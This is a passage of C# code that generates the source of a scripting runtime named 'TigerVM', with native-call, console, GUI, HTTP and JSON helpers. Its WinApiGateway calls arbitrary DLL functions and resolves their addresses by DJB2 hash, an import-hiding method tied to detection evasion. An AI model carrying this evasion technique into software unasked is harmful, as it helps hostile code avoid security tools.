            csBld.AppendLine("            }");
            csBld.AppendLine("        }");
            csBld.AppendLine("    }");
            csBld.AppendLine("");
            csBld.AppendLine("    public static class WinApiGateway {");
            csBld.AppendLine("        [DllImport(\"kernel32.dll\", CharSet = CharSet.Ansi, SetLastError = true)]");
            csBld.AppendLine("        private static extern IntPtr LoadLibraryA(string lpLibFileName);");
            csBld.AppendLine("        [DllImport(\"kernel32.dll\", CharSet = CharSet.Ansi, SetLastError = true)]");
            csBld.AppendLine("        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);");
            csBld.AppendLine("        [UnmanagedFunctionPointer(CallingConvention.StdCall)] private delegate IntPtr F0();");
            csBld.AppendLine("        [UnmanagedFunctionPointer(CallingConvention.StdCall)] private delegate IntPtr F1(IntPtr a1);");
            csBld.AppendLine("        [UnmanagedFunctionPointer(CallingConvention.StdCall)] private delegate IntPtr F2(IntPtr a1, IntPtr a2);");
            csBld.AppendLine("        [UnmanagedFunctionPointer(CallingConvention.StdCall)] private delegate IntPtr F3(IntPtr a1, IntPtr a2, IntPtr a3);");
            csBld.AppendLine("        [UnmanagedFunctionPointer(CallingConvention.StdCall)] private delegate IntPtr F4(IntPtr a1, IntPtr a2, IntPtr a3, IntPtr a4);");
            csBld.AppendLine("        [UnmanagedFunctionPointer(CallingConvention.StdCall)] private delegate IntPtr F5(IntPtr a1, IntPtr a2, IntPtr a3, IntPtr a4, IntPtr a5);");
            csBld.AppendLine("        [UnmanagedFunctionPointer(CallingConvention.StdCall)] private delegate IntPtr F6(IntPtr a1, IntPtr a2, IntPtr a3, IntPtr a4, IntPtr a5, IntPtr a6);");
            csBld.AppendLine("        [UnmanagedFunctionPointer(CallingConvention.StdCall)] private delegate IntPtr F7(IntPtr a1, IntPtr a2, IntPtr a3, IntPtr a4, IntPtr a5, IntPtr a6, IntPtr a7);");
            csBld.AppendLine("        [UnmanagedFunctionPointer(CallingConvention.StdCall)] private delegate IntPtr F8(IntPtr a1, IntPtr a2, IntPtr a3, IntPtr a4, IntPtr a5, IntPtr a6, IntPtr a7, IntPtr a8);");
            csBld.AppendLine("        public static long Invoke(string dllName, string funcName, string rawArgs, Dictionary<string, string> vars) {");
            csBld.AppendLine("            List<IntPtr> allocs = new List<IntPtr>();");
            csBld.AppendLine("            try {");
            csBld.AppendLine("                IntPtr hMod = LoadLibraryA(dllName);");
            csBld.AppendLine("                if (hMod == IntPtr.Zero) return -1;");
            csBld.AppendLine("                IntPtr pFunc = IntPtr.Zero;");
            csBld.AppendLine("                try { pFunc = TigerArmor.ResolveApiByHash(dllName, TigerArmor.HashDjb2(funcName)); } catch { }");
            csBld.AppendLine("                if (pFunc == IntPtr.Zero) pFunc = GetProcAddress(hMod, funcName);");
            csBld.AppendLine("                if (pFunc == IntPtr.Zero) return -2;");
            csBld.AppendLine("                List<string> argsList = new List<string>();");
            csBld.AppendLine("                var matches = Regex.Matches(rawArgs, \"\\\"[^\\\"]*\\\"|[^ ]+\");");
            csBld.AppendLine("                foreach (Match m in matches) { argsList.Add(m.Value.Trim('\\\"')); }");
            csBld.AppendLine("                bool isWide = funcName.EndsWith(\"W\", StringComparison.OrdinalIgnoreCase);");
            csBld.AppendLine("                IntPtr[] ptrs = new IntPtr[argsList.Count];");
            csBld.AppendLine("                for (int i = 0; i < argsList.Count; i++) {");
            csBld.AppendLine("                    string s = argsList[i];");
            csBld.AppendLine("                    long num;");
            csBld.AppendLine("                    if (long.TryParse(s, out num)) {");
            csBld.AppendLine("                        ptrs[i] = new IntPtr(num);");
            csBld.AppendLine("                    } else if (s.StartsWith(\"0x\", StringComparison.OrdinalIgnoreCase) && long.TryParse(s.Substring(2), System.Globalization.NumberStyles.HexNumber, null, out num)) {");
            csBld.AppendLine("                        ptrs[i] = new IntPtr(num);");
            csBld.AppendLine("                    } else {");
            csBld.AppendLine("                        IntPtr pStr = isWide ? Marshal.StringToHGlobalUni(s) : Marshal.StringToHGlobalAnsi(s);");
            csBld.AppendLine("                        allocs.Add(pStr);");
            csBld.AppendLine("                        ptrs[i] = pStr;");
            csBld.AppendLine("                    }");
            csBld.AppendLine("                }");
            csBld.AppendLine("                IntPtr ret = IntPtr.Zero;");
            csBld.AppendLine("                switch (ptrs.Length) {");
            csBld.AppendLine("                    case 0: ret = ((F0)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(F0)))(); break;");
            csBld.AppendLine("                    case 1: ret = ((F1)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(F1)))(ptrs[0]); break;");
            csBld.AppendLine("                    case 2: ret = ((F2)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(F2)))(ptrs[0], ptrs[1]); break;");
            csBld.AppendLine("                    case 3: ret = ((F3)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(F3)))(ptrs[0], ptrs[1], ptrs[2]); break;");
            csBld.AppendLine("                    case 4: ret = ((F4)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(F4)))(ptrs[0], ptrs[1], ptrs[2], ptrs[3]); break;");
            csBld.AppendLine("                    case 5: ret = ((F5)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(F5)))(ptrs[0], ptrs[1], ptrs[2], ptrs[3], ptrs[4]); break;");
            csBld.AppendLine("                    case 6: ret = ((F6)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(F6)))(ptrs[0], ptrs[1], ptrs[2], ptrs[3], ptrs[4], ptrs[5]); break;");
            csBld.AppendLine("                    case 7: ret = ((F7)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(F7)))(ptrs[0], ptrs[1], ptrs[2], ptrs[3], ptrs[4], ptrs[5], ptrs[6]); break;");
            csBld.AppendLine("                    case 8: ret = ((F8)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(F8)))(ptrs[0], ptrs[1], ptrs[2], ptrs[3], ptrs[4], ptrs[5], ptrs[6], ptrs[7]); break;");
            csBld.AppendLine("                    default: return -3;");
            csBld.AppendLine("                }");
            csBld.AppendLine("                return ret.ToInt64();");
            csBld.AppendLine("            } catch { return -99; }");
            csBld.AppendLine("            finally {");
            csBld.AppendLine("                foreach (IntPtr p in allocs) {");
            csBld.AppendLine("                    try { Marshal.FreeHGlobal(p); } catch { }");
            csBld.AppendLine("                }");
            csBld.AppendLine("            }");
            csBld.AppendLine("        }");
            csBld.AppendLine("    }");
            csBld.AppendLine("");
            csBld.AppendLine("    public static class TigerHud {");
            csBld.AppendLine("        public static void RenderBanner(string title, string subtitle) {");
            csBld.AppendLine("            Console.ForegroundColor = ConsoleColor.Cyan;");
            csBld.AppendLine("            Console.WriteLine(new string('=', 64));");
            csBld.AppendLine("            Console.Write(\" [TigerVM] \");");
            csBld.AppendLine("            Console.ForegroundColor = ConsoleColor.White;");
            csBld.AppendLine("            Console.WriteLine(title);");
            csBld.AppendLine("            if (!string.IsNullOrEmpty(subtitle)) {");
            csBld.AppendLine("                Console.ForegroundColor = ConsoleColor.DarkCyan;");
            csBld.AppendLine("                Console.WriteLine(\"          \" + subtitle);");
            csBld.AppendLine("            }");
            csBld.AppendLine("            Console.ForegroundColor = ConsoleColor.Cyan;");
            csBld.AppendLine("            Console.WriteLine(new string('=', 64));");
            csBld.AppendLine("            Console.ResetColor();");
            csBld.AppendLine("        }");
            csBld.AppendLine("        public static void RenderProgress(int pct, string label) {");
            csBld.AppendLine("            pct = Math.Max(0, Math.Min(100, pct));");
            csBld.AppendLine("            int barWidth = 24;");
            csBld.AppendLine("            int filled = (pct * barWidth) / 100;");
            csBld.AppendLine("            Console.Write(\"\\r \");");
            csBld.AppendLine("            Console.ForegroundColor = ConsoleColor.DarkGray;");
            csBld.AppendLine("            Console.Write(\"[\");");
            csBld.AppendLine("            Console.ForegroundColor = ConsoleColor.Green;");
            csBld.AppendLine("            Console.Write(new string('#', filled));");
            csBld.AppendLine("            Console.ForegroundColor = ConsoleColor.DarkGreen;");
            csBld.AppendLine("            Console.Write(new string('-', barWidth - filled));");
            csBld.AppendLine("            Console.ForegroundColor = ConsoleColor.DarkGray;");
            csBld.AppendLine("            Console.Write(\"] \");");
            csBld.AppendLine("            Console.ForegroundColor = ConsoleColor.Yellow;");
            csBld.AppendLine("            Console.Write(pct.ToString().PadLeft(3) + \"% \");");
            csBld.AppendLine("            Console.ForegroundColor = ConsoleColor.White;");
            csBld.AppendLine("            Console.Write(label.PadRight(28));");
            csBld.AppendLine("            Console.ResetColor();");
            csBld.AppendLine("            if (pct >= 100) Console.WriteLine();");
            csBld.AppendLine("        }");
            csBld.AppendLine("        public static void RenderMatrix(int lines) {");
            csBld.AppendLine("            Random r = new Random();");
            csBld.AppendLine("            string chars = \"0123456789ABCDEF!@#$%&*?+\";");
            csBld.AppendLine("            for (int l = 0; l < lines; l++) {");
            csBld.AppendLine("                StringBuilder sb = new StringBuilder();");
            csBld.AppendLine("                for (int c = 0; c < 60; c++) {");
            csBld.AppendLine("                    sb.Append(r.Next(0, 4) == 0 ? chars[r.Next(chars.Length)] : ' ');");
            csBld.AppendLine("                }");
            csBld.AppendLine("                Console.ForegroundColor = (l % 2 == 0) ? ConsoleColor.Green : ConsoleColor.DarkGreen;");
            csBld.AppendLine("                Console.WriteLine(\"  \" + sb.ToString());");
            csBld.AppendLine("                System.Threading.Thread.Sleep(15);");
            csBld.AppendLine("            }");
            csBld.AppendLine("            Console.ResetColor();");
            csBld.AppendLine("        }");
            csBld.AppendLine("        public static void RenderSpinner(int durationMs, string label) {");
            csBld.AppendLine("            char[] spinChars = new[] { '|', '/', '-', '\\\\' };");
            csBld.AppendLine("            int delay = 80; int count = Math.Max(1, durationMs / delay);");
            csBld.AppendLine("            for (int i = 0; i < count; i++) {");
            csBld.AppendLine("                Console.Write(\"\\r \");");
            csBld.AppendLine("                Console.ForegroundColor = ConsoleColor.Cyan;");
            csBld.AppendLine("                Console.Write(\"[\" + spinChars[i % spinChars.Length] + \"] \");");
            csBld.AppendLine("                Console.ForegroundColor = ConsoleColor.White;");
            csBld.AppendLine("                Console.Write(label);");
            csBld.AppendLine("                Console.ResetColor();");
            csBld.AppendLine("                System.Threading.Thread.Sleep(delay);");
            csBld.AppendLine("            }");
            csBld.AppendLine("            Console.Write(\"\\r \");");
            csBld.AppendLine("            Console.ForegroundColor = ConsoleColor.Green;");
            csBld.AppendLine("            Console.Write(\"[OK] \");");
            csBld.AppendLine("            Console.ForegroundColor = ConsoleColor.White;");
            csBld.AppendLine("            Console.WriteLine(label);");
            csBld.AppendLine("            Console.ResetColor();");
            csBld.AppendLine("        }");
            csBld.AppendLine("        public static void RenderTable(string rawData) {");
            csBld.AppendLine("            try {");
            csBld.AppendLine("                if (string.IsNullOrEmpty(rawData)) return;");
            csBld.AppendLine("                string[] rows = rawData.Split('|');");
            csBld.AppendLine("                if (rows.Length == 0) return;");
            csBld.AppendLine("                List<string[]> table = new List<string[]>();");
            csBld.AppendLine("                int maxCols = 0;");
            csBld.AppendLine("                foreach (string r in rows) {");
            csBld.AppendLine("                    string[] cols = r.Split(',');");
            csBld.AppendLine("                    for (int c = 0; c < cols.Length; c++) cols[c] = cols[c].Trim().Trim('\"', '\\'');");
            csBld.AppendLine("                    table.Add(cols);");
            csBld.AppendLine("                    if (cols.Length > maxCols) maxCols = cols.Length;");
            csBld.AppendLine("                }");
            csBld.AppendLine("                int[] colWidths = new int[maxCols];");
            csBld.AppendLine("                for (int c = 0; c < maxCols; c++) {");
            csBld.AppendLine("                    int w = 4;");
            csBld.AppendLine("                    foreach (var row in table) {");
            csBld.AppendLine("                        if (c < row.Length && row[c].Length > w) w = row[c].Length;");
            csBld.AppendLine("                    }");
            csBld.AppendLine("                    colWidths[c] = w + 2;");
            csBld.AppendLine("                }");
            csBld.AppendLine("                Action<char, char, char> printBorder = (left, mid, right) => {");
            csBld.AppendLine("                    Console.ForegroundColor = ConsoleColor.DarkCyan;");
            csBld.AppendLine("                    Console.Write(\"  \" + left);");
            csBld.AppendLine("                    for (int c = 0; c < maxCols; c++) {");
            csBld.AppendLine("                        Console.Write(new string('-', colWidths[c]));");
            csBld.AppendLine("                        if (c < maxCols - 1) Console.Write(mid);");
            csBld.AppendLine("                    }");
            csBld.AppendLine("                    Console.WriteLine(right);");
            csBld.AppendLine("                    Console.ResetColor();");
            csBld.AppendLine("                };");
            csBld.AppendLine("                printBorder('+', '+', '+');");
            csBld.AppendLine("                for (int r = 0; r < table.Count; r++) {");
            csBld.AppendLine("                    Console.Write(\"  \");");
            csBld.AppendLine("                    Console.ForegroundColor = ConsoleColor.DarkCyan;");
            csBld.AppendLine("                    Console.Write(\"|\");");
            csBld.AppendLine("                    var row = table[r];");
            csBld.AppendLine("                    for (int c = 0; c < maxCols; c++) {");
            csBld.AppendLine("                        string val = (c < row.Length) ? row[c] : \"\";");
            csBld.AppendLine("                        if (r == 0) Console.ForegroundColor = ConsoleColor.Yellow;");
            csBld.AppendLine("                        else Console.ForegroundColor = ConsoleColor.White;");
            csBld.AppendLine("                        Console.Write(\" \" + val.PadRight(colWidths[c] - 1));");
            csBld.AppendLine("                        Console.ForegroundColor = ConsoleColor.DarkCyan;");
            csBld.AppendLine("                        Console.Write(\"|\");");
            csBld.AppendLine("                    }");
            csBld.AppendLine("                    Console.WriteLine();");
            csBld.AppendLine("                    Console.ResetColor();");
            csBld.AppendLine("                    if (r == 0) printBorder('+', '+', '+');");
            csBld.AppendLine("                }");
            csBld.AppendLine("                printBorder('+', '+', '+');");
            csBld.AppendLine("            } catch { }");
            csBld.AppendLine("        }");
            csBld.AppendLine("    }");
            csBld.AppendLine("");
            csBld.AppendLine("    public static class TigerGui {");
            csBld.AppendLine("        public static string ShowMsgBox(string title, string text, string options) {");
            csBld.AppendLine("            try {");
            csBld.AppendLine("                string[] parts = (options ?? \"\").Split('|');");
            csBld.AppendLine("                string btnStr = parts.Length > 0 ? parts[0].Trim() : \"OK\";");
            csBld.AppendLine("                string iconStr = parts.Length > 1 ? parts[1].Trim() : \"Info\";");
            csBld.AppendLine("                System.Windows.Forms.MessageBoxButtons buttons = System.Windows.Forms.MessageBoxButtons.OK;");
            csBld.AppendLine("                if (btnStr.Equals(\"OKCancel\", StringComparison.OrdinalIgnoreCase)) buttons = System.Windows.Forms.MessageBoxButtons.OKCancel;");
            csBld.AppendLine("                else if (btnStr.Equals(\"YesNo\", StringComparison.OrdinalIgnoreCase)) buttons = System.Windows.Forms.MessageBoxButtons.YesNo;");
            csBld.AppendLine("                else if (btnStr.Equals(\"YesNoCancel\", StringComparison.OrdinalIgnoreCase)) buttons = System.Windows.Forms.MessageBoxButtons.YesNoCancel;");
            csBld.AppendLine("                else if (btnStr.Equals(\"RetryCancel\", StringComparison.OrdinalIgnoreCase)) buttons = System.Windows.Forms.MessageBoxButtons.RetryCancel;");
            csBld.AppendLine("                System.Windows.Forms.MessageBoxIcon icon = System.Windows.Forms.MessageBoxIcon.Information;");
            csBld.AppendLine("                if (iconStr.Equals(\"Warning\", StringComparison.OrdinalIgnoreCase)) icon = System.Windows.Forms.MessageBoxIcon.Warning;");
            csBld.AppendLine("                else if (iconStr.Equals(\"Error\", StringComparison.OrdinalIgnoreCase)) icon = System.Windows.Forms.MessageBoxIcon.Error;");
            csBld.AppendLine("                else if (iconStr.Equals(\"Question\", StringComparison.OrdinalIgnoreCase)) icon = System.Windows.Forms.MessageBoxIcon.Question;");
            csBld.AppendLine("                var res = System.Windows.Forms.MessageBox.Show(text, title, buttons, icon);");
            csBld.AppendLine("                return res.ToString();");
            csBld.AppendLine("            } catch { return \"Error\"; }");
            csBld.AppendLine("        }");
            csBld.AppendLine("        public static string ShowInputBox(string prompt, string defaultText, string title) {");
            csBld.AppendLine("            try {");
            csBld.AppendLine("                using (var form = new System.Windows.Forms.Form()) {");
            csBld.AppendLine("                    form.Text = string.IsNullOrEmpty(title) ? \"TigerVM Input\" : title;");
            csBld.AppendLine("                    form.Width = 420; form.Height = 170; form.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedDialog;");
            csBld.AppendLine("                    form.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen; form.MaximizeBox = false; form.MinimizeBox = false;");
            csBld.AppendLine("                    var lbl = new System.Windows.Forms.Label() { Left = 16, Top = 16, Width = 370, Text = prompt };");
            csBld.AppendLine("                    var txt = new System.Windows.Forms.TextBox() { Left = 16, Top = 42, Width = 370, Text = defaultText };");
            csBld.AppendLine("                    var btnOk = new System.Windows.Forms.Button() { Text = \"OK\", Left = 220, Width = 80, Top = 80, DialogResult = System.Windows.Forms.DialogResult.OK };");
            csBld.AppendLine("                    var btnCancel = new System.Windows.Forms.Button() { Text = \"Cancel\", Left = 306, Width = 80, Top = 80, DialogResult = System.Windows.Forms.DialogResult.Cancel };");
            csBld.AppendLine("                    form.Controls.Add(lbl); form.Controls.Add(txt); form.Controls.Add(btnOk); form.Controls.Add(btnCancel);");
            csBld.AppendLine("                    form.AcceptButton = btnOk; form.CancelButton = btnCancel;");
            csBld.AppendLine("                    return form.ShowDialog() == System.Windows.Forms.DialogResult.OK ? txt.Text : \"\";");
            csBld.AppendLine("                }");
            csBld.AppendLine("            } catch { return \"\"; }");
            csBld.AppendLine("        }");
            csBld.AppendLine("        public static string ShowFileDialog(string title, string filter, string mode) {");
            csBld.AppendLine("            try {");
            csBld.AppendLine("                if (mode.Equals(\"save\", StringComparison.OrdinalIgnoreCase)) {");
            csBld.AppendLine("                    using (var sfd = new System.Windows.Forms.SaveFileDialog()) {");
            csBld.AppendLine("                        sfd.Title = title; sfd.Filter = string.IsNullOrEmpty(filter) ? \"All Files (*.*)|*.*\" : filter;");
            csBld.AppendLine("                        return sfd.ShowDialog() == System.Windows.Forms.DialogResult.OK ? sfd.FileName : \"\";");
            csBld.AppendLine("                    }");
            csBld.AppendLine("                } else {");
            csBld.AppendLine("                    using (var ofd = new System.Windows.Forms.OpenFileDialog()) {");
            csBld.AppendLine("                        ofd.Title = title; ofd.Filter = string.IsNullOrEmpty(filter) ? \"All Files (*.*)|*.*\" : filter;");
            csBld.AppendLine("                        return ofd.ShowDialog() == System.Windows.Forms.DialogResult.OK ? ofd.FileName : \"\";");
            csBld.AppendLine("                    }");
            csBld.AppendLine("                }");
            csBld.AppendLine("            } catch { return \"\"; }");
            csBld.AppendLine("        }");
            csBld.AppendLine("    }");
            csBld.AppendLine("");
            csBld.AppendLine("    public static class TigerHttp {");
            csBld.AppendLine("        public static string Get(string url, int timeoutMs) {");
            csBld.AppendLine("            try {");
            csBld.AppendLine("                var req = (System.Net.HttpWebRequest)System.Net.WebRequest.Create(url);");
            csBld.AppendLine("                req.Timeout = timeoutMs > 0 ? timeoutMs : 10000; req.UserAgent = \"TigerVM/8.0\";");
            csBld.AppendLine("                using (var resp = req.GetResponse()) using (var stream = resp.GetResponseStream()) using (var reader = new StreamReader(stream, Encoding.UTF8)) { return reader.ReadToEnd(); }");
            csBld.AppendLine("            } catch (Exception ex) { return \"HTTP_ERROR: \" + ex.Message; }");
            csBld.AppendLine("        }");
            csBld.AppendLine("        public static string Post(string url, string payload, string contentType, int timeoutMs) {");
            csBld.AppendLine("            try {");
            csBld.AppendLine("                var req = (System.Net.HttpWebRequest)System.Net.WebRequest.Create(url);");
            csBld.AppendLine("                req.Method = \"POST\"; req.Timeout = timeoutMs > 0 ? timeoutMs : 10000;");
            csBld.AppendLine("                req.ContentType = string.IsNullOrEmpty(contentType) ? \"application/json\" : contentType; req.UserAgent = \"TigerVM/8.0\";");
            csBld.AppendLine("                byte[] data = Encoding.UTF8.GetBytes(payload ?? \"\"); req.ContentLength = data.Length;");
            csBld.AppendLine("                using (var reqStream = req.GetRequestStream()) { reqStream.Write(data, 0, data.Length); }");
            csBld.AppendLine("                using (var resp = req.GetResponse()) using (var stream = resp.GetResponseStream()) using (var reader = new StreamReader(stream, Encoding.UTF8)) { return reader.ReadToEnd(); }");
            csBld.AppendLine("            } catch (Exception ex) { return \"HTTP_ERROR: \" + ex.Message; }");
            csBld.AppendLine("        }");
            csBld.AppendLine("    }");
            csBld.AppendLine("");
            csBld.AppendLine("    public static class TigerNotify {");
            csBld.AppendLine("        public static void ShowToast(string title, string msg, int timeoutSec, string iconStr) {");
            csBld.AppendLine("            try {");
            csBld.AppendLine("                using (var notify = new System.Windows.Forms.NotifyIcon()) {");
            csBld.AppendLine("                    notify.Icon = System.Drawing.SystemIcons.Information; notify.Visible = true;");
            csBld.AppendLine("                    var tipIcon = System.Windows.Forms.ToolTipIcon.Info;");
            csBld.AppendLine("                    if (iconStr.Equals(\"Warning\", StringComparison.OrdinalIgnoreCase)) tipIcon = System.Windows.Forms.ToolTipIcon.Warning;");
            csBld.AppendLine("                    else if (iconStr.Equals(\"Error\", StringComparison.OrdinalIgnoreCase)) tipIcon = System.Windows.Forms.ToolTipIcon.Error;");
            csBld.AppendLine("                    notify.ShowBalloonTip(timeoutSec * 1000, title, msg, tipIcon);");
            csBld.AppendLine("                    System.Threading.Thread.Sleep(500);");
            csBld.AppendLine("                }");
            csBld.AppendLine("            } catch { }");
            csBld.AppendLine("        }");
            csBld.AppendLine("    }");
            csBld.AppendLine("");
            csBld.AppendLine("    public static class TigerData {");
            csBld.AppendLine("        private static readonly System.Data.DataSet _db = new System.Data.DataSet(\"TigerDb\");");
            csBld.AppendLine("        private static readonly object _dbLock = new object();");
            csBld.AppendLine("        public static string JsonGet(string json, string path) {");
            csBld.AppendLine("            try {");
            csBld.AppendLine("                if (string.IsNullOrEmpty(json) || string.IsNullOrEmpty(path)) return \"\";");
            csBld.AppendLine("                path = path.Trim().Trim('\"', '\\'');");
            csBld.AppendLine("                object current = ParseJson(json);");
            csBld.AppendLine("                string[] tokens = path.Split('.');");
            csBld.AppendLine("                foreach (string token in tokens) {");
            csBld.AppendLine("                    if (current == null) return \"\";");
            csBld.AppendLine("                    string key = token; int arrayIndex = -1;");
            csBld.AppendLine("                    int bOpen = token.IndexOf('[');");
            csBld.AppendLine("                    if (bOpen != -1 && token.EndsWith(\"]\")) {");
            csBld.AppendLine("                        key = token.Substring(0, bOpen);");
            csBld.AppendLine("                        int bClose = token.IndexOf(']');");
            csBld.AppendLine("                        int.TryParse(token.Substring(bOpen + 1, bClose - bOpen - 1), out arrayIndex);");
            csBld.AppendLine("                    }");
            csBld.AppendLine("                    if (!string.IsNullOrEmpty(key)) {");
            csBld.AppendLine("                        var dict = current as Dictionary<string, object>;");
            csBld.AppendLine("                        if (dict == null || !dict.ContainsKey(key)) return \"\";");
            csBld.AppendLine("                        current = dict[key];");
            csBld.AppendLine("                    }");
            csBld.AppendLine("                    if (arrayIndex >= 0) {");
            csBld.AppendLine("                        var list = current as List<object>;");
            csBld.AppendLine("                        if (list == null || arrayIndex < 0 || arrayIndex >= list.Count) return \"\";");
            csBld.AppendLine("                        current = list[arrayIndex];");
            csBld.AppendLine("                    }");
            csBld.AppendLine("                }");
            csBld.AppendLine("                return current != null ? current.ToString() : \"\";");
            csBld.AppendLine("            } catch { return \"\"; }");
            csBld.AppendLine("        }");
            csBld.AppendLine("        public static string JsonSet(string json, string path, string newVal) {");
            csBld.AppendLine("            try {");
            csBld.AppendLine("                path = path.Trim().Trim('\"', '\\'');");
            csBld.AppendLine("                newVal = newVal.Trim().Trim('\"', '\\'');");
            csBld.AppendLine("                object root = string.IsNullOrEmpty(json) ? new Dictionary<string, object>() : ParseJson(json);");
            csBld.AppendLine("                if (root == null) root = new Dictionary<string, object>();");
            csBld.AppendLine("                string[] tokens = path.Split('.');");
            csBld.AppendLine("                object current = root;");
            csBld.AppendLine("                for (int i = 0; i < tokens.Length; i++) {");
            csBld.AppendLine("                    string token = tokens[i];");
            csBld.AppendLine("                    string key = token; int arrayIndex = -1;");
            csBld.AppendLine("                    int bOpen = token.IndexOf('[');");
            csBld.AppendLine("                    if (bOpen != -1 && token.EndsWith(\"]\")) {");
            csBld.AppendLine("                        key = token.Substring(0, bOpen);");
            csBld.AppendLine("                        int bClose = token.IndexOf(']');");
            csBld.AppendLine("                        int.TryParse(token.Substring(bOpen + 1, bClose - bOpen - 1), out arrayIndex);");
            csBld.AppendLine("                    }");
            csBld.AppendLine("                    bool isLast = (i == tokens.Length - 1);");
            csBld.AppendLine("                    if (current is Dictionary<string, object>) {");
            csBld.AppendLine("                        var dict = (Dictionary<string, object>)current;");
            csBld.AppendLine("                        if (!string.IsNullOrEmpty(key)) {");
            csBld.AppendLine("                            if (arrayIndex >= 0) {");
            csBld.AppendLine("                                if (!dict.ContainsKey(key) || !(dict[key] is List<object>)) dict[key] = new List<object>();");
            csBld.AppendLine("                                var list = (List<object>)dict[key];");
            csBld.AppendLine("                                while (list.Count <= arrayIndex) list.Add(null);");
            csBld.AppendLine("                                if (isLast) list[arrayIndex] = newVal;");
            csBld.AppendLine("                                else { if (list[arrayIndex] == null) list[arrayIndex] = new Dictionary<string, object>(); current = list[arrayIndex]; }");
            csBld.AppendLine("                            } else {");
            csBld.AppendLine("                                if (isLast) dict[key] = newVal;");
            csBld.AppendLine("                                else { if (!dict.ContainsKey(key) || dict[key] == null) dict[key] = new Dictionary<string, object>(); current = dict[key]; }");
            csBld.AppendLine("                            }");
            csBld.AppendLine("                        }");
            csBld.AppendLine("                    }");
            csBld.AppendLine("                }");
            csBld.AppendLine("                return SerializeJson(root);");
            csBld.AppendLine("            } catch { return json; }");
            csBld.AppendLine("        }");
            csBld.AppendLine("        public static string SerializeJson(object obj) {");
            csBld.AppendLine("            if (obj == null) return \"null\";");
            csBld.AppendLine("            if (obj is string) return \"\\\"\" + ((string)obj).Replace(\"\\\\\", \"\\\\\\\\\").Replace(\"\\\"\", \"\\\\\\\"\").Replace(\"\\n\", \"\\\\n\").Replace(\"\\r\", \"\\\\r\") + \"\\\"\";");
            csBld.AppendLine("            if (obj is bool) return (bool)obj ? \"true\" : \"false\";");
            csBld.AppendLine("            if (obj is Dictionary<string, object>) {");
            csBld.AppendLine("                var dict = (Dictionary<string, object>)obj;");
            csBld.AppendLine("                StringBuilder sb = new StringBuilder(\"{\");");
            csBld.AppendLine("                bool first = true;");
            csBld.AppendLine("                foreach (var kv in dict) {");
            csBld.AppendLine("                    if (!first) sb.Append(\",\");");
            csBld.AppendLine("                    first = false;");
            csBld.AppendLine("                    sb.Append(\"\\\"\").Append(kv.Key).Append(\"\\\":\").Append(SerializeJson(kv.Value));");
            csBld.AppendLine("                }");
            csBld.AppendLine("                sb.Append(\"}\");");
            csBld.AppendLine("                return sb.ToString();");
            csBld.AppendLine("            }");
            csBld.AppendLine("            if (obj is List<object>) {");
            csBld.AppendLine("                var list = (List<object>)obj;");
            csBld.AppendLine("                StringBuilder sb = new StringBuilder(\"[\");");
            csBld.AppendLine("                bool first = true;");
            csBld.AppendLine("                foreach (var item in list) {");
            csBld.AppendLine("                    if (!first) sb.Append(\",\");");
            csBld.AppendLine("                    first = false;");
            csBld.AppendLine("                    sb.Append(SerializeJson(item));");
            csBld.AppendLine("                }");
            csBld.AppendLine("                sb.Append(\"]\");");
            csBld.AppendLine("                return sb.ToString();");
            csBld.AppendLine("            }");
            csBld.AppendLine("            return obj.ToString();");
            csBld.AppendLine("        }");
            csBld.AppendLine("        public static object ParseJson(string json) {");
            csBld.AppendLine("            if (string.IsNullOrEmpty(json)) return null;");
            csBld.AppendLine("            json = json.Trim();");
            csBld.AppendLine("            if (json.StartsWith(\"\\\"\") && json.EndsWith(\"\\\"\") && json.Length >= 2) {");
            csBld.AppendLine("                json = json.Substring(1, json.Length - 2).Trim();");
            csBld.AppendLine("            }");
            csBld.AppendLine("            if (json.StartsWith(\"\\\\\\\"\") || json.Contains(\"\\\\\\\"\")) {");
            csBld.AppendLine("                json = json.Replace(\"\\\\\\\"\", \"\\\"\");");
            csBld.AppendLine("            }");
            csBld.AppendLine("            int idx = 0; return ParseValue(json, ref idx);");
            csBld.AppendLine("        }");
            csBld.AppendLine("        private static object ParseValue(string json, ref int idx) {");
            csBld.AppendLine("            SkipWs(json, ref idx); if (idx >= json.Length) return null;");
            csBld.AppendLine("            char c = json[idx];");
            csBld.AppendLine("            if (c == '{') return ParseObject(json, ref idx);");
            csBld.AppendLine("            if (c == '[') return ParseArray(json, ref idx);");
            csBld.AppendLine("            if (c == (char)34 || c == (char)39) return ParseString(json, ref idx);");
            csBld.AppendLine("            if (char.IsDigit(c) || c == '-') return ParseNumber(json, ref idx);");
            csBld.AppendLine("            if (json.Substring(idx).StartsWith(\"true\", StringComparison.OrdinalIgnoreCase)) { idx += 4; return true; }");
            csBld.AppendLine("            if (json.Substring(idx).StartsWith(\"false\", StringComparison.OrdinalIgnoreCase)) { idx += 5; return false; }");
            csBld.AppendLine("            if (json.Substring(idx).StartsWith(\"null\", StringComparison.OrdinalIgnoreCase)) { idx += 4; return null; }");
            csBld.AppendLine("            return null;");
            csBld.AppendLine("        }");
            csBld.AppendLine("        private static Dictionary<string, object> ParseObject(string json, ref int idx) {");
            csBld.AppendLine("            var dict = new Dictionary<string, object>(StringComparer.OrdinalIgnoreCase);");
            csBld.AppendLine("            idx++;");
            csBld.AppendLine("            while (idx < json.Length) {");
            csBld.AppendLine("                SkipWs(json, ref idx); if (idx >= json.Length || json[idx] == '}') { if (idx < json.Length) idx++; break; }");
            csBld.AppendLine("                if (json[idx] == ',') { idx++; continue; }");
            csBld.AppendLine("                string key = ParseString(json, ref idx); SkipWs(json, ref idx);");
            csBld.AppendLine("                if (idx < json.Length && json[idx] == ':') idx++;");
            csBld.AppendLine("                object val = ParseValue(json, ref idx); dict[key] = val;");
            csBld.AppendLine("            }");
            csBld.AppendLine("            return dict;");
            csBld.AppendLine("        }");
            csBld.AppendLine("        private static List<object> ParseArray(string json, ref int idx) {");
            csBld.AppendLine("            var list = new List<object>(); idx++;");
            csBld.AppendLine("            while (idx < json.Length) {");
